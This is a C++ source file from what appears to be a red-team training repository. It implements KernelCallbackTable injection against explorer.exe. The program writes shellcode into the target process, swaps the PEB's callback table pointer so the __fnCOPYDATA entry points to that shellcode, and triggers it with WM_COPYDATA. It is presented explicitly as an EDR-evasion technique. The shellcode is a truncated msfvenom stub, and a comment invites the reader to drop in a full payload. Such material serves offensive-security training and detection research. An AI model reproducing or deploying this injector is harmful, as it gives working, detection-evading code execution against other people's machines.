/*
 * Red Team Exercises #66 - Kernel Callback Table Injection for EDR Evasion
 * Author: Joas Antonio dos Santos
 * Repository: https://github.com/CyberSecurityUP/Red-Team-Exercises
 * Courses: https://courses.redteamleaders.com/
 *
 * Description:
 *   Overwrites a KernelCallbackTable entry in a target process's PEB
 *   to redirect execution to shellcode. Triggered via window message,
 *   avoiding CreateRemoteThread / QueueUserAPC detection patterns.
 *
 * Target: explorer.exe (has a window, not PPL-protected)
 * Compile: cl /EHsc kernel_callback_injection.cpp
 */

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// NtQueryInformationProcess function type
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// ---------------------------------------------------------------
// Shellcode placeholder - replace with your payload
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
// ---------------------------------------------------------------
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    // ... truncated for brevity - use full shellcode in production
    "\x00\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

SIZE_T shellcodeSize = sizeof(shellcode);

// ---------------------------------------------------------------
// Find process by name
// ---------------------------------------------------------------
DWORD FindProcess(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return pid;
}

// ---------------------------------------------------------------
// Find a window belonging to the target PID
// ---------------------------------------------------------------
struct EnumData {
    DWORD targetPid;
    HWND  resultHwnd;
};

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
    EnumData* data = (EnumData*)lParam;
    DWORD windowPid = 0;
    GetWindowThreadProcessId(hwnd, &windowPid);

    if (windowPid == data->targetPid && IsWindowVisible(hwnd)) {
        data->resultHwnd = hwnd;
        return FALSE; // Stop enumeration
    }
    return TRUE;
}

HWND FindWindowForPid(DWORD pid) {
    EnumData data = { pid, NULL };
    EnumWindows(EnumWindowsCallback, (LPARAM)&data);
    return data.resultHwnd;
}

// ---------------------------------------------------------------
// Main injection logic
// ---------------------------------------------------------------
int main() {
    printf("[*] Red Team Exercises #66 - Kernel Callback Table Injection\n\n");

    // Step 1: Find target process (explorer.exe)
    DWORD targetPid = FindProcess(L"explorer.exe");
    if (!targetPid) {
        printf("[-] explorer.exe not found\n");
        return 1;
    }
    printf("[+] Target: explorer.exe (PID: %lu)\n", targetPid);

    // Step 2: Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, targetPid
    );
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    // Step 3: Read PEB to get KernelCallbackTable address
    pNtQueryInformationProcess NtQueryInfo =
        (pNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG retLen = 0;
    NTSTATUS status = NtQueryInfo(hProcess, ProcessBasicInformation,
                                   &pbi, sizeof(pbi), &retLen);
    if (status != 0) {
        printf("[-] NtQueryInformationProcess failed: 0x%lx\n", status);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] PEB address: 0x%p\n", pbi.PebBaseAddress);

    // Read PEB from target process
    PEB remotePeb = {};
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &remotePeb,
                           sizeof(PEB), &bytesRead)) {
        printf("[-] Failed to read PEB: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // KernelCallbackTable is at offset 0x58 in x64 PEB
    PVOID pKernelCallbackTable = remotePeb.KernelCallbackTable;
    if (!pKernelCallbackTable) {
        printf("[-] KernelCallbackTable is NULL (process has no GUI?)\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] KernelCallbackTable at: 0x%p\n", pKernelCallbackTable);

    // Step 4: Read the original callback table
    // The table is an array of function pointers. We'll read a chunk of it.
    const int TABLE_SIZE = 100; // number of entries to copy
    ULONG_PTR originalTable[TABLE_SIZE] = {};
    if (!ReadProcessMemory(hProcess, pKernelCallbackTable, originalTable,
                           sizeof(originalTable), &bytesRead)) {
        printf("[-] Failed to read callback table: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Read %zu bytes from callback table\n", bytesRead);

    // Step 5: Write shellcode to target process
    LPVOID pShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!pShellcode) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    WriteProcessMemory(hProcess, pShellcode, shellcode, shellcodeSize, NULL);
    printf("[+] Shellcode written to: 0x%p\n", pShellcode);

    // Step 6: Create modified callback table
    // Replace entry index 5 (__fnCOPYDATA - triggered by WM_COPYDATA)
    const int CALLBACK_INDEX = 5;
    ULONG_PTR modifiedTable[TABLE_SIZE];
    memcpy(modifiedTable, originalTable, sizeof(originalTable));
    modifiedTable[CALLBACK_INDEX] = (ULONG_PTR)pShellcode;

    // Write modified table to target process
    LPVOID pNewTable = VirtualAllocEx(hProcess, NULL, sizeof(modifiedTable),
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
    WriteProcessMemory(hProcess, pNewTable, modifiedTable,
                       sizeof(modifiedTable), NULL);
    printf("[+] Modified callback table at: 0x%p\n", pNewTable);

    // Step 7: Update PEB to point to our modified callback table
    PVOID pKCTField = (BYTE*)pbi.PebBaseAddress + 0x58; // offset of KernelCallbackTable in x64 PEB
    WriteProcessMemory(hProcess, pKCTField, &pNewTable, sizeof(pNewTable), NULL);
    printf("[+] PEB KernelCallbackTable pointer updated\n");

    // Step 8: Trigger the callback by sending WM_COPYDATA to target window
    HWND targetHwnd = FindWindowForPid(targetPid);
    if (!targetHwnd) {
        printf("[-] No window found for target PID\n");
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] Sending WM_COPYDATA to window 0x%p...\n", targetHwnd);

    COPYDATASTRUCT cds = {};
    cds.dwData = 1;
    cds.cbData = 4;
    cds.lpData = (PVOID)"test";

    SendMessageA(targetHwnd, WM_COPYDATA, (WPARAM)targetHwnd, (LPARAM)&cds);
    printf("[+] WM_COPYDATA sent - shellcode should have executed!\n");

    // Step 9: Restore original callback table (cleanup)
    Sleep(1000);
    WriteProcessMemory(hProcess, pKCTField, &pKernelCallbackTable,
                       sizeof(pKernelCallbackTable), NULL);
    printf("[+] Original KernelCallbackTable restored\n");

    CloseHandle(hProcess);
    printf("[+] Done.\n");
    return 0;
}
